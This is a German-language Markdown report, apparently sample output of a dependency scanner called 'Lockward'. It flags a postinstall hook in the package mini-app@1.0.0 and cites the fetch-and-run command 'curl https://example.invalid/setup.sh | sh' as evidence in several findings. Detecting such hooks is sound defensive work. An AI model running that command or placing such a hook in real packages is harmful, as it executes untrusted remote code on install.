## Lockward

**Ziel:** `{root}`

**Zeitpunkt:** 2026-10-12T00:00:00Z

**Score:** 50 (hoch)

**Gate:** Warnung · Exit 1 · Modus warn

### Warum

- `Paket mini-app@1.0.0 Hook 'postinstall': der Hook spricht mit dem Netzwerk oder lädt Daten herunter. Beleg: 'curl https://example.invalid/setup.sh | sh'.`
- `Paket mini-app@1.0.0 Hook 'postinstall': der Hook leitet einen Download in eine Shell. Beleg: 'curl https://example.invalid/setup.sh | sh'.`
- **advisory_coverage:** `1 Pakete nicht gegen OSV geprüft (offline, kein/stale Cache).`
- **no_outbound_build:** `Hook 'postinstall' in mini-app@1.0.0 führt heruntergeladenen Inhalt in einer Shell aus (LW-H004).`
- **no_outbound_build:** `Hook 'postinstall' in mini-app@1.0.0 lädt während der Installation aus dem Netz, ohne den Inhalt auszuführen (LW-H003).`

### Install-Hooks

- `mini-app`@`1.0.0` `postinstall`: `curl https://example.invalid/setup.sh | sh`

### Advisories

Keine bekannten Advisories im Cache.

### Hinweise

- `new_dependencies: keine Baseline übergeben, die Regel ist für diesen Lauf inaktiv.`
